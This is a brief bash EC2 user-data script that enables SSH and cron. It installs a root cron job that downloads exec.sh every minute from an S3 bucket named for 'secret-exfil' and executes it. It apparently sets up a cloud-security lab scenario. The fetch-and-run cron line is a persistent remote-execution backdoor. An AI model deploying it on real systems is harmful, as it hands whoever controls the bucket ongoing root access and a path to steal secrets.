#!/bin/bash
# 로그 출력
exec > /var/log/user-data.log 2>&1

dnf install -y ec2-instance-connect
systemctl enable sshd
systemctl start sshd

dnf install -y cronie
systemctl enable crond
systemctl start crond


tee /etc/cron.d/s3-script-job > /dev/null << 'EOF'
* * * * * root aws s3 cp s3://kcloudlab-cloud-secret-exfil-s3bucket/exec.sh /tmp/exec.sh && bash /tmp/exec.sh
EOF

chmod 644 /etc/cron.d/s3-script-job